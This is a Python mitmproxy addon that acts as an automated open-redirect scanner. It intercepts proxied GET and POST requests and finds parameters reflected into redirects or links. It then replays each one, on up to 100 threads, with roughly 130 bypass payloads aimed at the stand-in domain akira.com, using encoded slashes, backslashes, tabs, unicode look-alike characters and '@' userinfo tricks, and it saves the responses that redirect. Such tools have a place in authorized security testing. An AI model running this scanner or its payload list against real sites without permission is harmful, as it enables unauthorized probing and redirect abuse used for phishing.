from mitmproxy import http, ctx
from mitmproxy.io import FlowWriter
import copy
import os
import urllib.parse
import json
import re
import time
from concurrent.futures import ThreadPoolExecutor

class OpenRedirect:
    def __init__(self):
        self.flow_dir_openred = "openred_flows"
        os.makedirs(self.flow_dir_openred, exist_ok=True)
        self.escaped_value = None
        self.alteration_indicators_openred = [
    "//akira.com/%2f..",
    r"//{host}@akira.com/%2f..",
    "///akira.com/%2f..",
    r"///{host}@akira.com/%2f..",
    "////akira.com/%2f..",
    r"////{host}@akira.com/%2f..",
    "https://akira.com/%2f..",
    r"https://{host}@akira.com/%2f..",
    "/https://akira.com/%2f..",
    r"/https://{host}@akira.com/%2f..",
    "//www.akira.com/%2f%2e%2e",
    r"//{host}@www.akira.com/%2f%2e%2e",
    "///www.akira.com/%2f%2e%2e",
    r"///{host}@www.akira.com/%2f%2e%2e",
    "////www.akira.com/%2f%2e%2e",
    r"////{host}@www.akira.com/%2f%2e%2e",
    "https://www.akira.com/%2f%2e%2e",
    r"https://{host}@www.akira.com/%2f%2e%2e",
    "/https://www.akira.com/%2f%2e%2e",
    r"/https://{host}@www.akira.com/%2f%2e%2e",
    "//akira.com/",
    r"//{host}@akira.com/",
    "///akira.com/",
    r"///{host}@akira.com/",
    "////akira.com/",
    r"////{host}@akira.com/",
    "https://akira.com/",
    r"https://{host}@akira.com/",
    "/https://akira.com/",
    r"/https://{host}@akira.com/",
    "//akira.com//",
    r"//{host}@akira.com//",
    "///akira.com//",
    r"///{host}@akira.com//",
    "////akira.com//",
    r"////{host}@akira.com//",
    "https://akira.com//",
    r"https://{host}@akira.com//",
    "//https://akira.com//",
    r"//https://{host}@akira.com//",
    "//www.akira.com/%2e%2e%2f",
    r"//{host}@www.akira.com/%2e%2e%2f",
    "///www.akira.com/%2e%2e%2f",
    r"///{host}@www.akira.com/%2e%2e%2f",
    "////www.akira.com/%2e%2e%2f",
    r"////{host}@www.akira.com/%2e%2e%2f",
    "https://www.akira.com/%2e%2e%2f",
    r"https://{host}@www.akira.com/%2e%2e%2f",
    "//https://www.akira.com/%2e%2e%2f",
    r"//https://{host}@www.akira.com/%2e%2e%2f",
    "///www.akira.com/%2e%2e",
    r"///{host}@www.akira.com/%2e%2e",
    "////www.akira.com/%2e%2e",
    r"////{host}@www.akira.com/%2e%2e",
    "https:///www.akira.com/%2e%2e",
    r"https:///{host}@www.akira.com/%2e%2e",
    "//https:///www.akira.com/%2e%2e",
    r"//{host}@https:///www.akira.com/%2e%2e",
    "/https://www.akira.com/%2e%2e",
    r"/https://{host}@www.akira.com/%2e%2e",
    "///www.akira.com/%2f%2e%2e",
    r"///{host}@www.akira.com/%2f%2e%2e",
    "////www.akira.com/%2f%2e%2e",
    r"////{host}@www.akira.com/%2f%2e%2e",
    "https:///www.akira.com/%2f%2e%2e",
    r"https:///{host}@www.akira.com/%2f%2e%2e",
    "/https://www.akira.com/%2f%2e%2e",
    r"/https://{host}@www.akira.com/%2f%2e%2e",
    "/https:///www.akira.com/%2f%2e%2e",
    r"/https:///{host}@www.akira.com/%2f%2e%2e",
    "/%09/akira.com",
    r"/%09/{host}@akira.com",
    "//%09/akira.com",
    r"//%09/{host}@akira.com",
    "///%09/akira.com",
    r"///%09/{host}@akira.com",
    "////%09/akira.com",
    r"////%09/{host}@akira.com",
    "https://%09/akira.com",
    r"https://%09/{host}@akira.com",
    "/%5cakira.com",
    r"/%5c{host}@akira.com",
    "//%5cakira.com",
    r"//%5c{host}@akira.com",
    "///%5cakira.com",
    r"///%5c{host}@akira.com",
    "////%5cakira.com",
    r"////%5c{host}@akira.com",
    "https://%5cakira.com",
    r"https://%5c{host}@akira.com",
    "/https://%5cakira.com",
    r"/https://%5c{host}@akira.com",
    "https://akira.com",
    r"https://{host}@akira.com",
    "//akira.com",
    "https:akira.com",
    r"\/\/akira.com/",
    r"/\/akira.com/",
    r"https://{host}/https://www.akira.com/",
    "〱akira.com",
    "〵akira.com",
    "ゝakira.com",
    "ーakira.com",
    "ｰakira.com",
    "/〱akira.com",
    "/〵akira.com",
    "/ゝakira.com",
    "/ーakira.com",
    "/ｰakira.com",
    "<>//akira.com",
    r"//akira.com\@{host}",
    r"https://:@akira.com\@{host}",
    r"http://akira.com:80#@{host}/",
    r"http://akira.com:80?@{host}/",
    r"http://akira.com\{host}",
    r"http://akira.com&{host}",
    "http:///////////akira.com",
    r"\\akira.com",
    r"http://{host}.akira.com"
]
        self.altered_header_openred = "x-altered-openred"

    def response(self, flow: http.HTTPFlow) -> None:
       

        if self.altered_header_openred in flow.request.headers:
            self.check_altered_reflection_openred(flow)
            return

        if flow.request.method == "GET":
            self.process_parameters_openred(flow, flow.request.query)
        elif flow.request.method == "POST":
            self.process_post_request_openred(flow)

    def process_post_request_openred(self, flow):
        content_type = flow.request.headers.get("Content-Type", "")
        if "application/x-www-form-urlencoded" in content_type:
            params = urllib.parse.parse_qs(flow.request.get_text())
            self.process_parameters_openred(flow, params)
        elif "application/json" in content_type:
            try:
                params = json.loads(flow.request.get_text())
                if isinstance(params, dict):
                    self.process_parameters_openred(flow, params)
            except json.JSONDecodeError:
                ctx.log.info("JSON decode error")

    def process_parameters_openred(self, flow, params):
        def process_value(param, value):
            
            if isinstance(value, str):
                self.escaped_value = re.escape(value)
                # Your existing logic for using escaped_value
            elif isinstance(value, list):
                # If the value is a list, process each item
                value = value[0]
                self.escaped_value = re.escape(value)
            elif isinstance(value, dict):
                # If the value is a dict, recursively process each key-value pair
                for key, val in value.items():
                    process_value(f"{param}[{key}]", val)  # Adjust the param name as needed
                    self.escaped_value = re.escape(val)
            else:
                # Optionally handle other non-string types or log them
                ctx.log.info(f"Unhandled value type for param '{param}': {type(value)}")
            
                # Define patterns to search for in the response body
            patterns = [
                rf"window\.location\.href\s*=\s*\"{self.escaped_value}\"",
                rf"window\.location\.replace\s*\(\s*\"{self.escaped_value}\"\s*\)",
                rf"href=\"{self.escaped_value}\"",
                rf"src=\"{self.escaped_value}\"",
            

            ]
            # Check the response body for each pattern
            body_string = flow.response.get_text()
            for pattern in patterns:
                if re.search(pattern, body_string):
                    self.handle_reflection(flow, param, value)
                    break  # Stop after the first match

            # Optionally check the Location header without URL encoding
            location_header = flow.response.headers.get("Location", "")
            if value in location_header:  # Simple containment check
                self.handle_reflection(flow, param, value)
        for param, value in params.items():

            process_value(param, value)
            

    def handle_reflection(self, flow, param, value):
        with ThreadPoolExecutor(max_workers=100) as executor:
            # Logic to handle the reflection, e.g., logging, altering, and replaying
            for indicator in self.alteration_indicators_openred:
                executor.submit(self.alter_and_replay_openred, flow, param, value, indicator)

    def alter_and_replay_openred(self, original_flow, param, original_value, indicator):
        altered_value = indicator
        altered_flow = self.alter_request_openred(original_flow, param, altered_value)
        if altered_flow:
            ctx.master.commands.call("replay.client", [altered_flow])

    def alter_request_openred(self, original_flow, param, altered_value):
        new_request = copy.deepcopy(original_flow.request)
        if original_flow.request.method == "GET":
            new_request.query[param] = altered_value
        else:
            content_type = new_request.headers.get("Content-Type", "")
            if "application/x-www-form-urlencoded" in content_type:
                params = urllib.parse.parse_qs(new_request.get_text())
                params[param] = [altered_value]
                new_request.text = urllib.parse.urlencode(params, doseq=True)
            elif "application/json" in content_type:
                try:
                    body = json.loads(new_request.get_text())
                    if isinstance(body, dict):
                        body[param] = altered_value
                        new_request.text = json.dumps(body)
                except json.JSONDecodeError:
                    pass
        new_request.headers[self.altered_header_openred] = "true"
        altered_flow = http.HTTPFlow(original_flow.client_conn, original_flow.server_conn)
        altered_flow.request = new_request
        return altered_flow

    def check_altered_reflection_openred(self, flow):
        # Corrected the indentation and the regex pattern
        pattern = r'^https?:\/\/(www\.)?akira\.com'
        location = flow.response.headers.get("Location", "")
        if re.search(pattern, location):
            self.save_flow_openred(flow)
            return

        response_text = flow.response.get_text()
        redirect_patterns = [
            r'window\.location\.replace\s*\(\s*"https?:\/\/(www\.)?akira\.com"\s*\)',
            r'window\.location\.replace\s*\(\s*"https?:\/\/(www\.)?akira\.com"\s*\)',
            r'window\.location\.href\s*=\s*"/www.akira.com"',
            r'window\.location\.href\s*=\s*"/akira.com"',
            r'window\.location\.replace\s*\(\s*"/www.akira.com"\s*\)',
            r'window\.location\.replace\s*\(\s*"/akira.com"\s*\)',
            r'href="https?:\/\/(www\.)?akira\.com"',
            r'src="https?:\/\/(www\.)?akira\.com"',
            r'src="\/akira\.com"',
            r'href="\/akira\.com"'
        ]
        for pattern in redirect_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                self.save_flow_openred(flow)
                break

    def save_flow_openred(self, flow):
        filename = os.path.join(self.flow_dir_openred, f"openredirect_request_{int(time.time())}.mitm")
        try:
            with open(filename, "wb") as file:
                fw = FlowWriter(file)
                fw.add(flow)
            ctx.log.info(f"Saved openred flow to {filename}")
        except OSError as e:
            ctx.log.error(f"Error saving .mitm file: {e}")

addons = [OpenRedirect()]
